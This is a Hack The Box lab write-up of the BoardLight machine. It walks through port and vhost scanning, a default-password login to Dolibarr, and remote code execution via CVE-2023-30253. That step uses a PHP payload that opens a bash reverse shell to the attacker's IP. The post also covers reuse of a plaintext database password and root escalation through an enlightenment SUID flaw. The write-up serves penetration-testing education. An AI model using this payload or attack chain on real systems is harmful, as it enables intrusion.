---
layout: post
title:  "HTB - BoardLight"
date:   2025-02-09 18:06:30 +0000
categories: htb 
---

# Machine Description

BoardLight is an easy difficulty Linux machine that features a `Dolibarr` instance vulnerable to [CVE-2023-30253](https://nvd.nist.gov/vuln/detail/CVE-2023-30253). This vulnerability is leveraged to gain access as `www-data`. After enumerating and dumping the web configuration file contents, plaintext credentials lead to `SSH` access to the machine. Enumerating the system, a `SUID` binary related to `enlightenment` is identified which is vulnerable to privilege escalation via [CVE-2022-37706]( https://nvd.nist.gov/vuln/detail/CVE-2022-37706) and can be abused to leverage a root shell.

---

# Machine Resolution

In order to verify the connection with the machine, I sent a ICMP Echo Request packet using the `ping` command:

{% highlight shell %}
bloody@pc: ping -c 1 10.10.11.11       
PING 10.10.11.11 (10.10.11.11) 56(84) bytes of data.
64 bytes from 10.10.11.11: icmp_seq=1 ttl=63 time=2184 ms

--- 10.10.11.11 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
{% endhighlight %}

By looking at the ICMP Echo Reply message, I confirm the connectivity with the machine and that it's probably running Linux as
the operative system, since the Time-To-Live parameter value is close to 64.  
I can't guarantee that it's running that operative system, since there are mechanisms to change the default TTL value.

Proceeding to the next step, I started by enumerating all the open TPC ports, in order to find a possible penetration vector. 
For that, I used the `nmap` (network scan tool) with some flags to realize a faster scan, saving the grepable output on a file
named `allPorts`.

{% highlight shell %}
bloody@pc: sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.11 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-15 17:27 EDT
Initiating SYN Stealth Scan at 17:27
Scanning 10.10.11.11 [65535 ports]
Discovered open port 80/tcp on 10.10.11.11
Discovered open port 22/tcp on 10.10.11.11
Completed SYN Stealth Scan at 17:27, 28.50s elapsed (65535 total ports)
Nmap scan report for 10.10.11.11
Host is up, received user-set (2.0s latency).
Scanned at 2024-07-15 17:27:18 EDT for 29s
Not shown: 46999 filtered tcp ports (no-response), 18534 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 28.62 seconds
           Raw packets sent: 126885 (5.583MB) | Rcvd: 20059 (802.424KB)
{% endhighlight %}

Interpreting the output, I can conclude that the machine has two open TCP ports:

**1.** 22 (SSH)  
**2.** 80 (HTTP)

After copying the ports number, I reran the `nmap` tool, but now scanning for services and the versions
running on those ports. This is an optimized step that I personally take on my scans, so that
the elapsed time of the scan is reduced, being crucial on systems that may run a trap on some
ports, resulting on a high slow rate of the scan.

{% highlight shell %}
bloody@pc: nmap -sCV -p22,80 10.10.11.11 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-15 17:31 EDT
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 17:31 (0:00:06 remaining)
Nmap scan report for 10.10.11.11
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesnt have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.44 seconds
{% endhighlight %}

With the output saved on a file named `targeted`, I can now proceed to analyse it.  
Looking at it, I can confirm the running operative system, running the Ubuntu Linux distribution.  

Starting by the website running on TCP port 80, I accessed it on the browser, being fronted with this home page:

<p align="center" width="100%">
    <img width="100%" src="/assets/images/boardlight/boardlight.png">
</p>

Looking at the page footer, I found a section with information about the consulting firm:

<p align="center" width="100%">
    <img width="33%" src="/assets/images/boardlight/boardlight_footer.png">
</p>

The relevant data is the domain `board.htb` used on the email address, being an important step to find more attack vectors.
For that, I added a new entry to my `/etc/hosts` file, being that used for future scans.  

By that, I spent some time visualizing the source code of the pages, looking for any commentary left behind with useful information, the
cookies section of the devtools and even enumerating for directories, but I didn't find anything util. By that, I enumerated the vhosts,
using the `gobuster` tool:

{% highlight shell %}
bloody@pc: gobuster vhost -k --domain "board.htb" --append-domain -u 10.10.11.11 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 200
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://10.10.11.11
[+] Method:          GET
[+] Threads:         200
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: crm.board.htb Status: 200 [Size: 6360]
{% endhighlight %}

Looking at the output, I found a subdomain that answered with a different Host header: `crm.board.htb`  
To use it as a new attack vector, I added it to the original domain on the `/etc/hosts` file.  

As I did for the other domain, I restarted my approach by accessing the website, which is a login page:

<p align="center" width="100%">
    <img width="50%" src="/assets/images/boardlight/boardlight_login.png">
</p>

By looking at the page, I could see the version used on the instance of Dolibarr, being it `17.0.0`.
Before searching for any default credential of that platform on the online documentation, I tried the pair `admin:admin`, 
resulting on the access to the dashboard. Therefore, I could visualize that the user that I logged in couldn't use
all the features of the platform, but I was able to create websites.

Searching for exploits on `Dolibarr 17.0.0`, I found various POC scripts of the `CVE-2023–30253`.
Better understanding the vulnerability, I could write malicious code on the website that I would create,
being it executed on the server, since there was no proper user input validation.  

Consequently, I wrote PHP code to invoke a bash reverse shell:

{% highlight shell %}
<!-- Enter here your HTML content. Add a section with an id tag and tag contenteditable="true" if you want to use the inline editor for the content  -->
<section id="mysection1" contenteditable="true">

<?pHp exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.23/1337 0>&1'"); ?>

</section>
{% endhighlight %}

In order to get the reverse shell, I runned the `netcat` listener on my machine at tcp port `1337`.
By that, I only needed to run the malicious code inserted on the source of the website that I created, being that triggered by
previewing the website using the binoculars icon on the top-right corner.

As a result of that, I got a basic shell on the machine, upgrading it in order to have a full interactive TTY.  
After looking at the current user, being it `www-data`, the new objective was to escalate my privileges, either
to the root or another user. For that, I looked for the `/etc/passwd` file, grepping for users with active shells:

{% highlight shell %}
www-data@boardlight:/home$ cat /etc/passwd | grep "bash"
root:x:0:0:root:/root:/bin/bash
larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash
{% endhighlight %}

Analysing the output, I found that there was another user called `larissa`, but the `www-data` user couldn't access the 
other user home directory.  

Looking at the files existing on the home folder of the current user, I came to the configuration file of `Dolibarr`, being
it located at `~/html/crm.board.htb/htdocs/conf/conf.php`. Visualizing it content:

{% highlight shell %}
<?php
//
// File generated by Dolibarr installer 17.0.0 on May 13, 2024
//
// Take a look at conf.php.example file for an example of conf.php file
// and explanations for all possibles parameters.
//
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';
...
$dolibarr_main_distrib='standard';
{% endhighlight %}

I found the credentials for the database, namely `dolibarrowner:serverfun2$2023!!`.  
I tried to switch to the root and larissa user, failing for the first one, but being successfull on `larissa`.
The next step that I took was optional, but it gave me a resilient shell, namely by connecting to the machine 
using `ssh`.

Now I could access the `larissa` home directory, finding the `user.txt` flag. The next phase was to escalate more 
my privileges until reach the root user. Considering that, I tried to run the command `sudo -l` to visualize
allowed commands and forbidden ones to the current user, but I came to the result that larissa doesn't have permission 
to execute `sudo`:

{% highlight shell %}
larissa@boardlight:~$ sudo -l                                          
[sudo] password for larissa: 
Sorry, user larissa may not run sudo on localhost.
{% endhighlight %}

By that, I search for files with the SUID permission:

{% highlight shell %}
larissa@boardlight:~$ find / -perm -4000 2>/dev/null                   
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/sudo
/usr/bin/su
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/vmware-user-suid-wrapper
{% endhighlight %}

Looking at the output, there were four uncommon entries, relative to the `enlightenment` window manager.  
In order to find a CVE, first I needed to know the current installed version, being able to find it by 
running `enlightenment -version` resulting on the version `0.23.1`.

Searching for vulnerabilities, I came across the `CVE-2022-37706` and a [POC](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh) for it. After reading the documentation of the POC, that's well structured and direct to the point, I runned the script 
on the larissa shell, resulting on a root shell.

---
# Improvements

After solving the machine, I identified several critical security improvements that should be taken in consideration to 
guarantee the security and integrity of the system:

- **OpenSSH and Apache:** Update these machine components to the latest stable version. Although they didn't impact the 
penetration test of the machine, they may be a new attack vector due to the possible existance of known vulnerabilities.
- **Dolibarr and Enlightenment:** Update/Patch these main resources in order to fix the exploited vulnerabilities.
- **Others:** Avoid using SUID Permission on files and storage credentials in plaintext.   